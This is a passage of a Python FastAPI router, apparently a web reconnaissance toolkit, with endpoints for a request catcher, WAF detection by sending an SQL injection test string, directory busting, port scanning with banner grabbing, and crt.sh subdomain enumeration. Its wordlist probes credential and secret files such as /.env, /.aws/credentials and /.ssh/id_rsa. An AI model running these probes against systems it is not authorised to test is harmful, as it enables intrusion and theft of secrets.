        "client_ip": request.client.host if request.client else "Unknown",
        "headers": dict(request.headers),
        "query_params": dict(request.query_params),
        "body": body_text,
        "cookies": dict(request.cookies)
    }
    
    # Salva na memória, restrito aos ultimos 50 requests por token pra nao estourar a RAM
    catcher_sessions[token].insert(0, log_entry)
    if len(catcher_sessions[token]) > 50:
        catcher_sessions[token] = catcher_sessions[token][:50]
        
    # Retorna uma imagem de pixel invisivel, JSON ou texto dependendo do que o cliente pediu
    accept = request.headers.get("accept", "")
    if "image" in accept:
        from fastapi.responses import Response
        # Pixel transparente 1x1 GIF
        pixel = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
        return Response(content=pixel, media_type="image/gif")
    
    return {"status": "ok"}

# ==========================================
# WAF DETECTOR
# ==========================================

import socket

@router.post("/waf-detector")
async def detect_waf(data: dict):
    """Detecta a presença de Web Application Firewalls"""
    try:
        url = data.get("url")
        if not url:
            raise HTTPException(status_code=400, detail="URL é obrigatória")
        
        validated_url = validate_url_input(url)
        
        # Conhecidos headers WAF/CDN
        waf_signatures = {
            "Cloudflare": {"headers": ["cf-ray", "cloudflare-nginx", "cf-request-id"], "server": "cloudflare"},
            "AWS WAF": {"headers": ["x-amzn-requestid", "x-amz-cf-id"], "server": "awselb"},
            "Akamai": {"headers": ["x-akamai-request-id", "akamai-origin-hop"], "server": "akamai"},
            "Sucuri": {"headers": ["x-sucuri-id", "x-sucuri-cache"], "server": "sucuri/cloudproxy"},
            "Imperva / Incapsula": {"headers": ["x-iinfo", "x-cdn"], "server": "incapsula"},
            "F5 BIG-IP": {"headers": ["x-cnection", "x-wa-info"], "server": "bigip"},
            "ModSecurity": {"server": "mod_security"},
            "Barracuda": {"server": "barracudaWAF"},
            "Fortinet FortiWeb": {"server": "fortiweb", "cookies": ["FORTIWAFSID"]},
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        }
        
        # Testar comportamento suspeito (enviar payload SQLi simples para ver se bloqueia)
        malicious_url = validated_url
        if "?" in malicious_url:
            malicious_url += "&test=1' OR '1'='1"
        else:
            malicious_url += "?test=1' OR '1'='1"
            
        async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as session:
            # Requisicao Normal
            try:
                async with session.get(validated_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False, allow_redirects=True) as normal_resp:
                    normal_status = normal_resp.status
                    normal_headers = {k.lower(): v.lower() for k, v in normal_resp.headers.items()}
                    normal_cookies = {k.lower(): v.value for k, v in normal_resp.cookies.items()}
            except Exception as e:
                raise HTTPException(status_code=400, detail=f"Falha na requisição normal: {str(e)}")
            
            # Requisicao Maliciosa
            try:
                async with session.get(malicious_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10), ssl=False, allow_redirects=True) as mal_resp:
                    mal_status = mal_resp.status
            except Exception:
                mal_status = 0 # Conexão fechada/timeout (comportamento de WAF)
                
        # Analisar resultados
        detected_waf = None
        confidence = 0
        details = []
        
        server_header = normal_headers.get("server", "")
        
        for waf_name, signatures in waf_signatures.items():
            waf_found = False
            # Check server string
            if "server" in signatures and signatures["server"] in server_header:
                detected_waf = waf_name
                confidence += 50
                details.append(f"Server header matches {waf_name} ({server_header})")
                waf_found = True
                
            # Check headers
            for h in signatures.get("headers", []):
                if h in normal_headers:
                    detected_waf = waf_name
                    confidence += 40
                    details.append(f"Header '{h}' found, specific to {waf_name}")
                    waf_found = True
                    
            # Check cookies
            for c in signatures.get("cookies", []):
                if c.lower() in normal_cookies:
                    detected_waf = waf_name
                    confidence += 30
                    details.append(f"Cookie '{c}' found, specific to {waf_name}")
                    waf_found = True
                    
            if waf_found:
                break
                
        # Check behavioral block
        blocks = [403, 406, 429, 501, 503]
        if mal_status in blocks and normal_status == 200:
            confidence += 40
            details.append(f"Behavioral Detection: Target returned HTTP {mal_status} for SQLi payload, but 200 for normal request.")
            if not detected_waf:
                detected_waf = "Generic/Unknown WAF"
        elif mal_status == 0 and normal_status == 200:
            confidence += 40
            details.append("Behavioral Detection: Connection dropped/timed out for SQLi payload.")
            if not detected_waf:
                detected_waf = "Generic/Unknown WAF"
                
        if confidence > 100: confidence = 100
        
        return {
            "has_waf": detected_waf is not None,
            "waf_name": detected_waf or "Nenhum WAF detectado",
            "confidence": confidence,
            "details": details if details else ["Nenhum indício de proteção WAF encontrado na resposta base ou comportamental."],
            "normal_status": normal_status,
            "malicious_status": mal_status,
            "server_header": server_header
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ==========================================
# DIRBUSTER WEB
# ==========================================

import asyncio
from typing import Tuple

@router.post("/dir-buster")
async def dir_buster(data: dict):
    """Fuzzer assíncrono para encontrar arquivos ocultos e expostos."""
    try:
        url = data.get("url")
        if not url:
            raise HTTPException(status_code=400, detail="URL é obrigatória")
            
        validated_url = validate_url_input(url).rstrip('/')
        
        # Wordlist enxuta focada em alto impacto
        wordlist = [
            "/.env", "/.git/config", "/.svn/entries", "/.htaccess", "/robots.txt", "/sitemap.xml",
            "/phpinfo.php", "/info.php", "/test.php", "/crossdomain.xml", "/server-status",
            "/wp-config.php", "/wp-config.php.bak", "/config.php", "/config.inc.php",
            "/.DS_Store", "/backup.zip", "/backup.sql", "/dump.sql", "/database.sql",
            "/db.sqlite", "/users.sql", "/admin", "/administrator", "/login", "/wp-admin",
            "/swagger/v1/swagger.json", "/api-docs", "/v1/api-docs", "/.ssh/id_rsa",
            "/.aws/credentials", "/package.json", "/composer.json", "/Dockerfile", "/docker-compose.yml"
        ]
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*"
        }
        
        results = []
        found_count = 0
        total_tested = len(wordlist)
        
        # Função interna assíncrona para testar 1 path
        async def test_path(session, path):
            target = f"{validated_url}{path}"
            try:
                # Usa allow_redirects=False para saber se o servidor esconde com 301/302
                async with session.head(target, headers=headers, timeout=aiohttp.ClientTimeout(total=5), ssl=False, allow_redirects=False) as resp:
                    status = resp.status
                    content_len = resp.headers.get("Content-Length", "0")
                    content_type = resp.headers.get("Content-Type", "")
                    
                    if status in [200, 204, 301, 302, 401, 403]:
                        # Ignorar 403 se for apenas forbidden genérico index
                        if status == 403 and path == "/admin":
                            return None
                        
                        return {
                            "path": path,
                            "url": target,
                            "status": status,
                            "size": int(content_len) if content_len.isdigit() else 0,
                            "type": content_type
                        }
            except Exception:
                pass
            return None

        # Executa em paralelo (tamanho do lote = 10 para não sobrecarregar e ser bloqueado)
        async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as session:
            # tasks já iniciam a execução, usando o semáforo para controle
            sem = asyncio.Semaphore(10)
            async def bound_test_path(path):
                async with sem:
                    return await test_path(session, path)
            
            tasks = [bound_test_path(p) for p in wordlist]
            gathered = await asyncio.gather(*tasks)
            
            # Limpa resultados Nulos
            results = [r for r in gathered if r is not None]
            
        # Classifica vulnerabilidades críticas (arquivos que não deveriam estar expostos de jeito nenhum)
        critical_paths = ["/.env", "/.git/config", "/.aws/credentials", "/.ssh/id_rsa", "/wp-config.php.bak", "/backup.zip", "/dump.sql"]
        for r in results:
            if r["path"] in critical_paths and r["status"] == 200:
                r["critical"] = True
            else:
                r["critical"] = False
                
        # Ordena: críticos primeiro, status 200 depois, resto depois
        results.sort(key=lambda x: (not x["critical"], x["status"] != 200, x["path"]))
            
        return {
            "target": validated_url,
            "total_tested": total_tested,
            "found_count": len(results),
            "results": results
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ==========================================
# PORT SCANNER & FINGERPRINTING
# ==========================================

@router.post("/port-scanner")
async def port_scanner(data: dict):
    """Scanner de portas assíncrono com extração de banners."""
    try:
        target = data.get("target")
        if not target:
            raise HTTPException(status_code=400, detail="Alvo (IP ou Domínio) é obrigatório")
            
        import socket
        from urllib.parse import urlparse
        
        # Limpar o input se vier como URL
        if "://" in target:
            target = urlparse(target).hostname
            
        try:
            # Tentar resolver o DNS (IP)
            target_ip = socket.gethostbyname(target)
        except socket.gaierror:
            raise HTTPException(status_code=400, detail="Não foi possível resolver o hostname para um IP válido.")
            
        # Top 30 portas mais comuns
        ports_to_scan = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
            993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 5432, 27017, 
            6379, 11211, 9200, 8000, 8888, 27015, 25565
        ]
        
        # Mapa de serviços conhecidos
        port_services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
            110: "POP3", 111: "RPCBind", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
            443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S", 1723: "PPTP",
            3306: "MySQL", 3389: "RDP", 5900: "VNC", 8080: "HTTP-Proxy",
            8443: "HTTPS-Alt", 5432: "PostgreSQL", 27017: "MongoDB", 
            6379: "Redis", 11211: "Memcached", 9200: "Elasticsearch",
            8000: "HTTP-Alt", 8888: "HTTP-Alt", 27015: "Source Engine", 25565: "Minecraft"
        }
        
        async def scan_port(port: int) -> Tuple[int, bool, str]:
            try:
                # Conectar com timeout de 1 segundo
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target_ip, port), timeout=1.0
                )
                
                # Porta aberta! Tentar extrair o banner
                banner = ""
                try:
                    # Enviar um probe genérico se for porta HTTP para encorajar resposta
                    if port in [80, 8080, 8443, 8000, 8888]:
                        writer.write(b"HEAD / HTTP/1.0\r\n\r\n")
                        await writer.drain()
                        
                    # Ler até 1024 bytes com timeout curto
                    data = await asyncio.wait_for(reader.read(1024), timeout=1.0)
                    if data:
                        banner = data.decode('utf-8', errors='ignore').strip()
                        # Limitar tamanho do banner log
                        banner = banner[:100] + "..." if len(banner) > 100 else banner
                except Exception:
                    pass # Timeout lendo banner, normal.
                finally:
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except:
                        pass
                
                return (port, True, banner)
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                return (port, False, "")
                
        # Scannear todas em paralelo
        tasks = [scan_port(p) for p in ports_to_scan]
        results = await asyncio.gather(*tasks)
        
        open_ports = []
        for port, is_open, banner in results:
            if is_open:
                open_ports.append({
                    "port": port,
                    "service": port_services.get(port, "Unknown"),
                    "banner": banner,
                    "state": "open"
                })
                
        # Ordenar por porta
        open_ports.sort(key=lambda x: x["port"])
        
        return {
            "target": target,
            "target_ip": target_ip,
            "total_scanned": len(ports_to_scan),
            "open_count": len(open_ports),
            "open_ports": open_ports
        }
        
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

# ==========================================
# SUBDOMAIN MAPPER
# ==========================================

import re

@router.post("/subdomain-mapper")
async def subdomain_mapper(data: dict):
    """Enumerador de Subdomínios usando crt.sh (Certificate Transparency)"""
    try:
        domain = data.get("domain")
        if not domain:
            raise HTTPException(status_code=400, detail="Domínio é obrigatório")
            
        import socket
        from urllib.parse import urlparse
        
        # Limpar o input para obter apenas o domínio principal
        if "://" in domain:
            domain = urlparse(domain).hostname
            
        # Remover 'www.' se presente
        if domain.startswith("www."):
            domain = domain[4:]
            
        # Validar formato do domínio básico
        if not re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', domain):
            raise HTTPException(status_code=400, detail="Formato de domínio inválido.")
            
        # Consultar crt.sh
        crt_url = f"https://crt.sh/?q=%.{domain}&output=json"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json"
        }
        
        subdomains = set()
        raw_results = []
        
        try:
            async with aiohttp.ClientSession(cookie_jar=aiohttp.DummyCookieJar()) as session:
                async with session.get(crt_url, headers=headers, timeout=aiohttp.ClientTimeout(total=15), ssl=False) as response:
                    if response.status == 200:
                        crt_data = await response.json()
                        for entry in crt_data:
                            name_value = entry.get("name_value", "")
                            # name_value can contain multiple subdomains separated by newline
                            for sub in name_value.split("\n"):
                                sub = sub.strip().lower()
                                if sub and sub.endswith(domain) and not sub.startswith("*"):
                                    subdomains.add(sub)
                                    raw_results.append(entry)
                    else:
                        raise HTTPException(status_code=502, detail=f"Erro ao consultar crt.sh: HTTP {response.status}")
        except asyncio.TimeoutError:
            raise HTTPException(status_code=504, detail="Timeout ao consultar a base de dados do crt.sh. Tente novamente mais tarde.")
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Erro na consulta: {str(e)}")
            
        # Resolver IPs para os subdomínios encontrados (limitado aos primeiros 50 para evitar delay)
        async def resolve_host(sub):
            try:
                loop = asyncio.get_event_loop()
                # dns resolution is blocking, run in executor
                ip = await loop.run_in_executor(None, socket.gethostbyname, sub)
                return {"subdomain": sub, "ip": ip, "resolved": True}
            except Exception:
                return {"subdomain": sub, "ip": "Não resolvido", "resolved": False}
                
        # Resolve using asyncio gather
        tasks = [resolve_host(sub) for sub in sorted(list(subdomains))[:50]]
        resolved_results = await asyncio.gather(*tasks)
        
        # Add remaining unresolved if total > 50
        for sub in sorted(list(subdomains))[50:]:
            resolved_results.append({"subdomain": sub, "ip": "Não resolvido (Limite Excedido)", "resolved": False})
            
        return {
            "domain": domain,
            "total_found": len(subdomains),
            "subdomains": resolved_results
        }
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
